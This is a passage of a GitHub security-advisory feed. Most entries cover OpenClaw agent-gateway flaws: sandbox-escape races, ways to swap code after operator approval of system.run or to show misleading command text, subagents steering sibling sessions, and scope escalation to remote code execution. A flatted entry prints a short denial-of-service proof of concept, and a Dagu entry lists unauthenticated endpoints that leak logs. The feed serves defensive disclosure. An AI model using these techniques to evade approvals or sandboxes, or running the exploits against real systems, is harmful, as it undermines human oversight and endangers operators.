<p>In affected versions of <code>openclaw</code>, sandbox fs-bridge writes validated the destination before commit, but temporary file creation and population were not pinned to a verified parent directory. A raced parent-path alias change could cause the staged temp file to be created outside the intended writable mount before the final guarded replace step.</p>
<h2 id="impact">Impact</h2>
<p>This is a sandbox boundary bypass affecting integrity and availability within the writable mount scope. Attacker-controlled bytes could be written outside the intended validated path before the final guarded step ran.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.8</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>The older staging flow created and wrote the temporary file using target-directory shell path operations before the final replace step revalidated the destination. That meant the last guard protected only the final rename, not the earlier temp-file materialization path.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now resolves a pinned mount root plus relative parent path, creates the temporary file inside the verified parent directory, and performs the final atomic replace from that pinned directory context. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-mj4p-rc52-m843">https://github.com/openclaw/openclaw/security/advisories/GHSA-mj4p-rc52-m843</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-mj4p-rc52-m843">https://github.com/advisories/GHSA-mj4p-rc52-m843</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mj4p-rc52-m843</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T15:48:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Write-scoped callers could reach admin-only session reset logic through `agent`]]></title>
        <id>https://github.com/advisories/GHSA-jf6w-m8jw-jfxc</id>
        <link href="https://github.com/advisories/GHSA-jf6w-m8jw-jfxc"/>
        <updated>2026-03-13T15:48:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, a gateway caller with <code>operator.write</code> could issue <code>agent</code> requests containing <code>/new</code> or <code>/reset</code> and reach the same reset path used by the admin-only <code>sessions.reset</code> RPC.</p>
<h2 id="impact">Impact</h2>
<p>On gateways where a caller is intentionally granted <code>operator.write</code> but not <code>operator.admin</code>, that caller could reset targeted conversation state through <code>agent</code> slash commands. This crosses the documented method-scope boundary between write-scoped messaging and admin-only session mutation.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.8</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>Scope checks were enforced only on the outer RPC method. The <code>agent</code> slash-command path reused admin-only reset logic internally, so a write-scoped caller could reach session-reset mutation without holding <code>operator.admin</code>.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw no longer routes conversation <code>/new</code> and <code>/reset</code> through the admin-only <code>sessions.reset</code> entry point. Reset logic now lives in a shared service, while <code>sessions.reset</code> remains admin-only. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-jf6w-m8jw-jfxc">https://github.com/openclaw/openclaw/security/advisories/GHSA-jf6w-m8jw-jfxc</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-jf6w-m8jw-jfxc">https://github.com/advisories/GHSA-jf6w-m8jw-jfxc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jf6w-m8jw-jfxc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-13T15:48:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Unrecognized script runners could bypass `system.run` approval integrity]]></title>
        <id>https://github.com/advisories/GHSA-qc36-x95h-7j53</id>
        <link href="https://github.com/advisories/GHSA-qc36-x95h-7j53"/>
        <updated>2026-03-13T15:48:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, node-host <code>system.run</code> approvals did not bind a mutable file operand for some script runners, including forms such as <code>tsx</code> and <code>jiti</code>. An attacker could obtain approval for a benign script-runner command, rewrite the referenced script on disk, and have the modified code execute under the already approved run context.</p>
<h2 id="impact">Impact</h2>
<p>Deployments that rely on node-host <code>system.run</code> approvals for script integrity could execute rewritten local code after operator approval. This can lead to unintended local code execution as the OpenClaw runtime user.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt; 2026.3.11</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>The approval planner only tracked mutable script operands for a hardcoded set of interpreters and runtime forms. Commands such as <code>tsx ./run.ts</code> and <code>jiti ./run.ts</code> fell through without a bound file snapshot, so the final pre-execution revalidation step was skipped.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now fails closed for approval-backed interpreter and runtime commands unless it can bind exactly one concrete local file operand, and it extends direct-file binding coverage for additional runtime forms. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-qc36-x95h-7j53">https://github.com/openclaw/openclaw/security/advisories/GHSA-qc36-x95h-7j53</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-qc36-x95h-7j53">https://github.com/advisories/GHSA-qc36-x95h-7j53</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc36-x95h-7j53</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T15:48:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Channel commands could bypass account-scoped `configWrites` restrictions]]></title>
        <id>https://github.com/advisories/GHSA-8jhh-jcqg-mj5p</id>
        <link href="https://github.com/advisories/GHSA-8jhh-jcqg-mj5p"/>
        <updated>2026-03-13T15:48:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, channel-initiated config mutations were authorized against the originating account's <code>configWrites</code> policy but did not consistently re-check the targeted account scope. An authorized sender on one account could mutate protected sibling-account configuration when the target account had <code>configWrites: false</code>.</p>
<h2 id="impact">Impact</h2>
<p>This is an account-scoped policy bypass inside a single gateway deployment. Channel commands such as <code>/config set channels.&lt;provider&gt;.accounts.&lt;id&gt;...</code> and config-backed <code>/allowlist ... --config --account &lt;id&gt;</code> could modify protected sibling-account configuration.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.8</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>The mutation path validated the origin account scope but did not consistently authorize every resolved target scope. Ambiguous collection and root writes under <code>channels</code> and <code>channels.&lt;provider&gt;.accounts</code> could therefore reach protected account configuration from channel command surfaces.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now authorizes config mutations against both the origin scope and each resolved target scope, and it rejects ambiguous root and collection writes from channel commands unless the caller is an internal gateway client with <code>operator.admin</code>. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-8jhh-jcqg-mj5p">https://github.com/openclaw/openclaw/security/advisories/GHSA-8jhh-jcqg-mj5p</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-8jhh-jcqg-mj5p">https://github.com/advisories/GHSA-8jhh-jcqg-mj5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8jhh-jcqg-mj5p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-13T15:47:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Node-host approvals could show misleading shell payloads instead of the executed argv]]></title>
        <id>https://github.com/advisories/GHSA-rw39-5899-8mxp</id>
        <link href="https://github.com/advisories/GHSA-rw39-5899-8mxp"/>
        <updated>2026-03-13T15:47:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, node-host <code>system.run</code> approvals could display only an extracted shell payload such as <code>jq --version</code> while execution still ran a different outer wrapper argv such as <code>./env sh -c 'jq --version'</code>.</p>
<h2 id="impact">Impact</h2>
<p>This is an approval-integrity bug. An attacker who could place or select a local wrapper binary and induce a wrapper-shaped command could get local code executed after the operator approved misleading command text.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.8</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>Wrapper resolution normalized executables by basename and extracted inner shell payload text for approval display, while execution still preserved the full wrapper argv. Approval storage and UI therefore showed text that did not match the exact command OpenClaw would execute.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now binds approvals to the exact executed argv and keeps extracted shell payload text only as secondary preview data. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rw39-5899-8mxp">https://github.com/openclaw/openclaw/security/advisories/GHSA-rw39-5899-8mxp</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-rw39-5899-8mxp">https://github.com/advisories/GHSA-rw39-5899-8mxp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rw39-5899-8mxp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T15:47:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Unbound interpreter and runtime commands could bypass node-host approval integrity]]></title>
        <id>https://github.com/advisories/GHSA-xf99-j42q-5w5p</id>
        <link href="https://github.com/advisories/GHSA-xf99-j42q-5w5p"/>
        <updated>2026-03-13T15:47:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, node-host <code>system.run</code> approvals could still execute rewritten local code for interpreter and runtime commands when OpenClaw could not bind exactly one concrete local file operand during approval planning.</p>
<h2 id="impact">Impact</h2>
<p>Deployments using node-host <code>system.run</code> approval mode could approve a benign local script and then execute different local code if that script changed before execution. This can lead to unintended local code execution as the OpenClaw runtime user.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.8</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>The approval flow treated some interpreter and runtime forms as approval-backed even when it could not honestly bind a single direct local script file. That left residual approval-integrity gaps for runtime forms outside the directly bound file set.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now fails closed for approval-backed interpreter and runtime commands unless it can bind exactly one concrete local file operand, and it extends best-effort direct-file binding for additional runtime forms. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-xf99-j42q-5w5p">https://github.com/openclaw/openclaw/security/advisories/GHSA-xf99-j42q-5w5p</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-xf99-j42q-5w5p">https://github.com/advisories/GHSA-xf99-j42q-5w5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xf99-j42q-5w5p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T15:47:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Leaf subagents could steer sibling sessions across sandbox boundaries]]></title>
        <id>https://github.com/advisories/GHSA-4w7m-58cg-cmff</id>
        <link href="https://github.com/advisories/GHSA-4w7m-58cg-cmff"/>
        <updated>2026-03-13T15:47:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, sandboxed leaf subagents could still access the <code>subagents</code> control surface and resolve against the parent requester scope instead of remaining confined to their own session tree.</p>
<h2 id="impact">Impact</h2>
<p>A low-privilege sandboxed leaf worker could steer or kill a sibling run owned by the same requester and cause that sibling to execute with its own broader tool policy. This is a sandbox and session-scope boundary bypass.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.8</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>Leaf subagents retained the <code>subagents</code> tool, and subagent control requests were authorized against the parent requester scope rather than the caller's own spawned descendants. The control path prevented only self-targeting, not cross-sibling steering.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now removes <code>subagents</code> control access from leaf subagents by default, scopes subagent control to the caller's own descendants, and rejects <code>steer</code> and <code>kill</code> requests that target runs outside that descendant tree. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-4w7m-58cg-cmff">https://github.com/openclaw/openclaw/security/advisories/GHSA-4w7m-58cg-cmff</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-4w7m-58cg-cmff">https://github.com/advisories/GHSA-4w7m-58cg-cmff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4w7m-58cg-cmff</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T15:47:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Pairing-scoped device tokens could mint `operator.admin` and reach node RCE]]></title>
        <id>https://github.com/advisories/GHSA-4jpw-hj22-2xmc</id>
        <link href="https://github.com/advisories/GHSA-4jpw-hj22-2xmc"/>
        <updated>2026-03-13T15:47:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, a caller holding only <code>operator.pairing</code> could use <code>device.token.rotate</code> to mint a new token with broader scopes for an already paired device. If the target device was approved for <code>operator.admin</code>, the attacker could obtain an administrative token without already holding administrative scope.</p>
<h2 id="impact">Impact</h2>
<p>This is a critical authorization flaw. On deployments with connected node hosts or companion apps that expose <code>system.run</code>, the escalated token could then modify node execution approvals and reach real remote code execution on the node. Even without nodes, the flaw still granted unauthorized gateway-admin access.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.8</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p><code>device.token.rotate</code> accepted caller-supplied target scopes and validated them against the target device's approved scopes, but it did not constrain the newly minted scopes to the caller's own current scope set. That allowed a pairing-scoped caller to mint a broader token for an already paired administrative device.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now enforces caller-scope subsetting in <code>device.token.rotate</code>, preventing callers from minting device tokens broader than the scopes they already hold. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-4jpw-hj22-2xmc">https://github.com/openclaw/openclaw/security/advisories/GHSA-4jpw-hj22-2xmc</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-4jpw-hj22-2xmc">https://github.com/advisories/GHSA-4jpw-hj22-2xmc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4jpw-hj22-2xmc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-13T15:47:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Plugin subagent routes could bypass gateway authorization with synthetic admin scopes]]></title>
        <id>https://github.com/advisories/GHSA-xw77-45gv-p728</id>
        <link href="https://github.com/advisories/GHSA-xw77-45gv-p728"/>
        <updated>2026-03-13T15:47:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, the plugin subagent runtime dispatched gateway methods through a synthetic operator client that always carried broad administrative scopes. Plugin-owned HTTP routes using <code>auth: "plugin"</code> could therefore trigger admin-only gateway actions without normal gateway authorization.</p>
<h2 id="impact">Impact</h2>
<p>This is a critical authorization bypass. An external unauthenticated request to a plugin-owned route could reach privileged subagent runtime methods and perform admin-only gateway actions such as deleting sessions, reading session data, or triggering agent execution.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&gt;= 2026.3.7, &lt; 2026.3.11</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>The new plugin subagent runtime preserved neither the original caller's auth context nor least-privilege scope. Instead, it executed gateway dispatches through a fabricated operator client with administrative scopes, which was reachable from plugin-owned routes that intentionally bypass normal gateway auth so plugins can perform their own webhook verification.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now preserves real authorization boundaries for plugin subagent calls instead of dispatching them through synthetic admin scopes. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-xw77-45gv-p728">https://github.com/openclaw/openclaw/security/advisories/GHSA-xw77-45gv-p728</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-xw77-45gv-p728">https://github.com/advisories/GHSA-xw77-45gv-p728</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw77-45gv-p728</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-13T15:47:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Sandbox `writeFile` commit could race outside the validated path]]></title>
        <id>https://github.com/advisories/GHSA-xvx8-77m6-gwg6</id>
        <link href="https://github.com/advisories/GHSA-xvx8-77m6-gwg6"/>
        <updated>2026-03-13T15:47:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, the sandbox fs-bridge <code>writeFile</code> commit step used an unanchored container path during the final move into place. An attacker racing parent-path changes inside the sandbox could redirect the committed file outside the validated sandbox path.</p>
<h2 id="impact">Impact</h2>
<p>This is a sandbox boundary bypass. In-sandbox code could win a time-of-check-time-of-use race and cause host-approved <code>writeFile</code> operations to land outside the validated writable path within the container mount namespace.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt; 2026.3.11</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>The hardening work for anchored remove, rename, and mkdir operations did not fully cover the <code>writeFile</code> commit path. The final <code>mv</code> still used the raw target path, leaving a race window between safety revalidation and the in-container commit step.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now anchors the <code>writeFile</code> commit path to the canonical parent directory before the final move. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-xvx8-77m6-gwg6">https://github.com/openclaw/openclaw/security/advisories/GHSA-xvx8-77m6-gwg6</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-xvx8-77m6-gwg6">https://github.com/advisories/GHSA-xvx8-77m6-gwg6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvx8-77m6-gwg6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-13T15:47:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flatted] flatted vulnerable to unbounded recursion DoS in parse() revive phase]]></title>
        <id>https://github.com/advisories/GHSA-25h7-pfq9-p65f</id>
        <link href="https://github.com/advisories/GHSA-25h7-pfq9-p65f"/>
        <updated>2026-03-13T15:40:44.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>flatted's <code>parse()</code> function uses a recursive <code>revive()</code> phase to resolve circular references in deserialized JSON. When given a crafted payload with deeply nested or self-referential <code>$</code> indices, the recursion depth is unbounded, causing a stack overflow that crashes the Node.js process.</p>
<h2 id="impact">Impact</h2>
<p>Denial of Service (DoS). Any application that passes untrusted input to <code>flatted.parse()</code> can be crashed by an unauthenticated attacker with a single request.</p>
<p>flatted has ~87M weekly npm downloads and is used as the circular-JSON serialization layer in many caching and logging libraries.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">const flatted = require('flatted');

// Build deeply nested circular reference chain
const depth = 20000;
const arr = new Array(depth + 1);
arr[0] = '{"a":"1"}';
for (let i = 1; i &lt;= depth; i++) {
  arr[i] = `{"a":"${i + 1}"}`;
}
arr[depth] = '{"a":"leaf"}';

const payload = JSON.stringify(arr);
flatted.parse(payload); // RangeError: Maximum call stack size exceeded
</code></pre>
<h2 id="fix">Fix</h2>
<p>The maintainer has already merged an iterative (non-recursive) implementation in PR #88, converting the recursive <code>revive()</code> to a stack-based loop.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p>All versions prior to the PR #88 fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WebReflection/flatted/security/advisories/GHSA-25h7-pfq9-p65f">https://github.com/WebReflection/flatted/security/advisories/GHSA-25h7-pfq9-p65f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32141">https://nvd.nist.gov/vuln/detail/CVE-2026-32141</a></li>
<li><a href="https://github.com/WebReflection/flatted/pull/88">https://github.com/WebReflection/flatted/pull/88</a></li>
<li><a href="https://github.com/WebReflection/flatted/commit/7eb65d857e1a40de11c47461cdbc8541449f0606">https://github.com/WebReflection/flatted/commit/7eb65d857e1a40de11c47461cdbc8541449f0606</a></li>
<li><a href="https://github.com/advisories/GHSA-25h7-pfq9-p65f">https://github.com/advisories/GHSA-25h7-pfq9-p65f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-25h7-pfq9-p65f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T15:40:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dagu] Dagu: SSE Authentication Bypass in Basic Auth Mode]]></title>
        <id>https://github.com/advisories/GHSA-9wmw-9wph-2vwp</id>
        <link href="https://github.com/advisories/GHSA-9wmw-9wph-2vwp"/>
        <updated>2026-03-13T15:05:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sse-authentication-bypass-in-basic-auth-mode">SSE Authentication Bypass in Basic Auth Mode</h1>
<h2 id="summary">Summary</h2>
<p>When Dagu is configured with HTTP Basic authentication (<code>DAGU_AUTH_MODE=basic</code>), all Server-Sent Events (SSE) endpoints are accessible without any credentials. This allows unauthenticated attackers to access real-time DAG execution data, workflow configurations, execution logs, and queue status — bypassing the authentication that protects the REST API.</p>
<h2 id="severity">Severity</h2>
<p><strong>HIGH</strong> (CVSS 3.1: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li>dagu v2.2.3 (latest) and likely all versions with basic auth support</li>
</ul>
<h2 id="affected-component">Affected Component</h2>
<p><code>internal/service/frontend/server.go</code> — <code>buildStreamAuthOptions()</code> function (lines 1177–1201)</p>
<h2 id="root-cause">Root Cause</h2>
<p>The <code>buildStreamAuthOptions()</code> function builds authentication options for SSE/streaming endpoints. When the auth mode is <code>basic</code>, it returns an <code>auth.Options</code> struct with <code>BasicAuthEnabled: true</code> but <code>AuthRequired</code> defaults to <code>false</code> (Go zero value):</p>
<pre><code class="language-go">// server.go:1195-1201
if authCfg.Mode == config.AuthModeBasic {
    return auth.Options{
        Realm:            realm,
        BasicAuthEnabled: true,
        Creds:            map[string]string{authCfg.Basic.Username: authCfg.Basic.Password},
        // AuthRequired is NOT set — defaults to false
    }
}
</code></pre>
<p>The authentication middleware at <code>internal/service/frontend/auth/middleware.go:181-183</code> allows unauthenticated requests when <code>AuthRequired</code> is false:</p>
<pre><code class="language-go">// No credentials provided
// If auth is not required, allow the request through
if !opts.AuthRequired {
    next.ServeHTTP(w, r)
    return
}
</code></pre>
<p>The developers left a FIXME comment (line 1193) acknowledging this issue:</p>
<pre><code>// FIXME: add a session-token mechanism for basic-auth users so browser
// EventSource requests can authenticate via the ?token= query parameter.
</code></pre>
<h2 id="exposed-sse-endpoints">Exposed SSE Endpoints</h2>
<p>All SSE routes are affected (<code>server.go:1004-1019</code>):</p>
<table>
<thead>
<tr>
<th>Endpoint</th>
<th>Data Leaked</th>
</tr>
</thead>
<tbody><tr>
<td><code>/api/v1/events/dags</code></td>
<td>All DAG names, descriptions, file paths, schedules, tags, execution status</td>
</tr>
<tr>
<td><code>/api/v1/events/dags/{fileName}</code></td>
<td>Individual DAG configuration details</td>
</tr>
<tr>
<td><code>/api/v1/events/dags/{fileName}/dag-runs</code></td>
<td>DAG execution history</td>
</tr>
<tr>
<td><code>/api/v1/events/dag-runs</code></td>
<td>All active DAG runs across the system</td>
</tr>
<tr>
<td><code>/api/v1/events/dag-runs/{name}/{dagRunId}</code></td>
<td>Specific DAG run status and node details</td>
</tr>
<tr>
<td><code>/api/v1/events/dag-runs/{name}/{dagRunId}/logs</code></td>
<td>Execution logs (may contain secrets, credentials, API keys)</td>
</tr>
<tr>
<td><code>/api/v1/events/dag-runs/{name}/{dagRunId}/logs/steps/{stepName}</code></td>
<td>Step-level stdout/stderr logs</td>
</tr>
<tr>
<td><code>/api/v1/events/queues</code></td>
<td>Queue status and pending work items</td>
</tr>
<tr>
<td><code>/api/v1/events/queues/{name}/items</code></td>
<td>Queue item details</td>
</tr>
<tr>
<td><code>/api/v1/events/docs-tree</code></td>
<td>Documentation tree</td>
</tr>
<tr>
<td><code>/api/v1/events/docs/*</code></td>
<td>Documentation content</td>
</tr>
</tbody></table>
<p>Additionally, the Agent SSE stream uses the same auth options (<code>server.go:1166</code>).</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash"># Start Dagu with basic auth
